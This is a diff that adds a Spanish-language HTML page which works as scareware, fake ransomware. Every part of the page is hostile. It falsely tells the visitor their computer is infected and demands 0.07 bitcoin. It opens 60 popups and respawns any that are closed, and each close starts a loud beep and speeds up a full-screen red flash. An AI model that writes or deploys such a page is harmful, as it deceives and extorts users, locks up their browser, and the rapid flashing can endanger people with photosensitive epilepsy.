@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8" />
+<title>bitcoinloader:C/(%joakuytruhstbruh</title>
+<style>
+  body {
+    margin: 0;
+    background-color: #8B0000;
+    color: white;
+    font-size: 50px;
+    font-weight: bold;
+    text-align: center;
+    animation: flashRed 400ms infinite;
+    font-family: Arial, sans-serif;
+    overflow: hidden;
+  }
+
+  @keyframes flashRed {
+    0%, 100% { background-color: #8B0000; }
+    50% { background-color: black; }
+  }
+
+  #mensaje {
+    margin-top: 20vh;
+  }
+</style>
+</head>
+<body>
+
+<div id="mensaje">Estás infectado, transfiere 0.07 bitcoins a la cuenta "NotVerySus" si quieres tu computadora devuelta.</div>
+
+<script>
+  const totalVentanas = 60;
+  let ventanasAbiertas = [];
+  let ventanasCerradas = 0;
+
+  function abrirVentana() {
+    const width = 300;
+    const height = 350;
+    const left = Math.floor(Math.random() * (screen.width - width));
+    const top = Math.floor(Math.random() * (screen.height - height));
+
+    let w = window.open('', '_blank', `width=${width},height=${height},left=${left},top=${top}`);
+
+    if (w) {
+      w.document.write(`
+        <title>Infectado!</title>
+        <style>
+          body {
+            margin: 0;
+            background-color: black;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: red;
+            font-size: 60px;
+            font-weight: bold;
+            font-family: Arial, sans-serif;
+            user-select: none;
+          }
+        </style>
+        <div>¡Virus!</div>
+        <script>
+          window.onbeforeunload = function() {
+            if (window.opener && window.opener.ventanaCerrada) {
+              window.opener.ventanaCerrada();
+            }
+          }
+        <\/script>
+      `);
+      w.document.close();
+    }
+    return w;
+  }
+
+  for (let i = 0; i < totalVentanas; i++) {
+    ventanasAbiertas.push(abrirVentana());
+  }
+
+  const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+  let oscillator;
+  let gainNode;
+  let beepInterval;
+
+  function startBeep() {
+    if (oscillator) return;
+
+    oscillator = audioCtx.createOscillator();
+    gainNode = audioCtx.createGain();
+
+    oscillator.type = 'square';
+    oscillator.frequency.setValueAtTime(800, audioCtx.currentTime);
+
+    oscillator.connect(gainNode);
+    gainNode.connect(audioCtx.destination);
+
+    oscillator.start();
+
+    let on = false;
+    beepInterval = setInterval(() => {
+      gainNode.gain.setValueAtTime(on ? 0 : 0.3, audioCtx.currentTime);
+      on = !on;
+    }, 250);
+  }
+
+  function stopBeep() {
+    if (!oscillator) return;
+    clearInterval(beepInterval);
+    oscillator.stop();
+    oscillator.disconnect();
+    gainNode.disconnect();
+    oscillator = null;
+    gainNode = null;
+  }
+
+  let velocidadParpadeo = 400;
+
+  window.ventanaCerrada = function() {
+    ventanasCerradas++;
+
+    for (let i = 0; i < ventanasAbiertas.length; i++) {
+      if (ventanasAbiertas[i].closed) {
+        ventanasAbiertas[i] = abrirVentana();
+      }
+    }
+
+    if (ventanasCerradas === 1) {
+      if (audioCtx.state === 'suspended') {
+        audioCtx.resume().then(() => startBeep());
+      } else {
+        startBeep();
+      }
+    }
+
+    velocidadParpadeo = Math.max(50, velocidadParpadeo / 2);
+
+    document.body.style.animation = 'none';
+    void document.body.offsetWidth;
+    document.body.style.animation = `flashRed ${velocidadParpadeo}ms infinite`;
+  };
+</script>
+
+</body>
+</html>
